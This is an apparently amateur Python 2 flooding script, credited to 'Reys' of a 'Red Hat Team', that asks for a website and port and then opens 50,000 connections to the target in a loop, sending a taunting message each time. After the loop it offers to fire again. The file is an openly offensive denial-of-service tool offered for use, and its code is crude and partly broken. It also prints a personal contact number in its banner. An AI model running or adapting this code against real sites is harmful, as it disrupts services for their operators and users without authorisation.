import time
import socket
import os
import sys
import string
#The green reaper tools
baner="""
The Green Reaper is here...
\033[1;92m                    ...       
\033[1;92m                  ;::::;     
\033[1;92m                ;::::; :;    
\033[1;92m              ;:::::'   :;   
\033[1;92m             ;:::::;     ;.  
\033[1;92m            ,:::::'       ;           \033[1;95mOOO\ 
\033[1;92m            ::::::;       ;          \033[1;95mOOOOO\ 
\033[1;92m            ;:::::;       ;         \033[1;95mOOOOOOOO 
\033[1;92m           ,;::::::;     ;'        \033[1;94m/   \033[1;95mOOOOOOO    
\033[1;92m         ;:::::::::`. ,,,;.       \033[1;94m/  /  \033[1;95m/DOOOOOO  
\033[1;92m       .';:::::::::::::::::;,    \033[1;94m/  /      \033[1;95m/DOOOO  
\033[1;92m      ,::::::;::::::;;;;::::;,  \033[1;94m/  /         \033[1;95m/DOOO  
\033[1;92m     ;`::::::`'::::::;;;::::: ,\033[1;94m/  /           \033[1;95m/DOOO  
\033[1;92m     :`:::::::`;::::::;;::: ;::\033[1;94m /              \033[1;95m/DOOO  
\033[1;92m     ::`:::::::`;:::::::: ;::::\033[1;94m/               \033[1;95m/DOO 
\033[1;92m     `:`:::::::`;:::::: ;::::::#                \033[1;95mDOO  
\033[1;92m      :::`:::::::`;; ;:::::::::##              \033[1;95mOO 
\033[1;92m      ::::`:::::::`;::::::::;:::#             \033[1;95mOO 
\033[1;92m      `:::::`::::::::::::;'`:;::#             \033[1;95mO 
\033[1;92m       `:::::`::::::::;'\033[1;94m /  / `:#                
\033[1;92m        ::::::`:::::;' \033[1;94m /  /   `#                
\033[1;96m|#########################################|
\033[1;96m|###| Author By    : Reys             |###| 
\033[1;96m|###| Contact/wa   : 0882284318474    |###|
\033[1;96m|###| Team         : Red Hat Team     |###|
\033[1;96m|#########################################|
"""
print baner
def restart_program():
    python = sys.executable
    os.execl(python, python, * sys.argv)
curdir = os.getcwd()
print ("\033[1;91minput web url \033[1;95m[ex : www.Example.com ]")
host=raw_input( "\033[1;94mReys@root : " )
print ("\033[1;91minput port \033[1;95m[ex : 8080 ]")
port=input("\033[1;94mReys@root : ")
connect=50000
ip = socket.gethostbyname( host )
print ( "\033[1;91m Attacking \033[1;93m[" + host + "]" )
print ( "\033[1;91m Attack to ip \033[1;93m["+ ip + "]" )
message=("ATTACK OF REYS AND RED HAT TEAM WAS HERE...")
print ("\033[1;91mFIRE..............................")
def dos():
    #pid = os.fork()
    ddos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        ddos.connect((host, 80))
        ddos.send( message )
        ddos.sendto( message, (ip, port) )
        ddos.send( message );
    except socket.error, msg:
        print("\033[1;91m ...no connection to [" + ip + "] ...")
    print ( "\033[1;92m ...start sending the coffin to [" + ip + "] ...")
    ddos.close()
for i in range(1, connect):
    dos()
print("Ddos anda telah berhenti.........")
if __name__ == "__main__":
    answer = raw_input("Anda mau lanjut ddos ??? ketik fire untuk lanjut...")
    if answer.strip() in "y Y fire Fire FIRE".split():
        restart_program()
    else:
        os.system(curdir+"Deqmain.py")
